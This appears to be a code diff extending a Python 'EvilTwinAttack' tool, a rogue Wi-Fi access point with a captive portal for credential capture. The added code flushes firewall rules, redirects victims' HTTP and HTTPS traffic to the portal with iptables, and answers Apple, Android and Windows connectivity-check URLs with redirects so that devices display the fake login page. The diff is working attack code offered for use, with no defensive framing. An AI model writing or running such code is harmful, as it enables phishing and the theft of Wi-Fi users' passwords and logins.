@@ -88,6 +88,40 @@ class EvilTwinAttack:
         print("[+] IP forwarding enabled")
 
 
+    def setup_iptables(self):
+        """Setup iptables to redirect HTTP traffic to captive portal"""
+        print("[*] Setting up iptables redirects...")
+
+        # Flush existing rules
+        subprocess.run(["iptables", "-F"], check=False)
+        subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
+
+        # Redirect HTTP (port 80) traffic to our web server
+        subprocess.run([
+            "iptables", "-t", "nat", "-A", "PREROUTING",
+            "-i", self.interface,
+            "-p", "tcp", "--dport", "80",
+            "-j", "DNAT", "--to-destination", f"{self.gateway_ip}:80"
+        ], check=False)
+
+        # Redirect HTTPS (port 443) to HTTP (so they see the portal)
+        subprocess.run([
+            "iptables", "-t", "nat", "-A", "PREROUTING",
+            "-i", self.interface,
+            "-p", "tcp", "--dport", "443",
+            "-j", "REDIRECT", "--to-port", "80"
+        ], check=False)
+
+        # Allow forwarding
+        subprocess.run([
+            "iptables", "-A", "FORWARD",
+            "-i", self.interface,
+            "-j", "ACCEPT"
+        ], check=False)
+
+        print("[+] iptables configured (errors ignored if nat table unavailable)")
+
+
     def create_hostapd_config(self):
         """Create hostapd configuration file"""
         print("[*] Creating hostapd config...")
@@ -229,6 +263,28 @@ dhcp-leasefile={self.dnsmasq_leases}
         os.chdir(str(self.portal_dir))
 
         class CaptivePortalHandler(SimpleHTTPRequestHandler):
+            def do_GET(self):
+                """Handle GET requests - trigger captive portal detection"""
+                # Captive portal detection URLs
+                captive_urls = [
+                    '/hotspot-detect.html',  # Apple
+                    '/library/test/success.html',  # Apple
+                    '/generate_204',  # Android/Chrome
+                    '/gen_204',  # Android
+                    '/ncsi.txt',  # Windows
+                    '/connecttest.txt',  # Windows
+                ]
+
+                # If it's a captive portal detection URL, return 302 redirect
+                if self.path in captive_urls:
+                    self.send_response(302)
+                    self.send_header('Location', 'http://10.0.0.1/')
+                    self.end_headers()
+                    return
+
+                # Otherwise serve files normally
+                super().do_GET()
+
             def do_POST(self):
                 """Handle credential capture"""
                 if self.path == "/capture":
@@ -281,6 +337,7 @@ dhcp-leasefile={self.dnsmasq_leases}
                 return
 
             self.enable_forwarding()
+            self.setup_iptables()
             self.create_hostapd_config()
             self.create_dnsmasq_config()
 
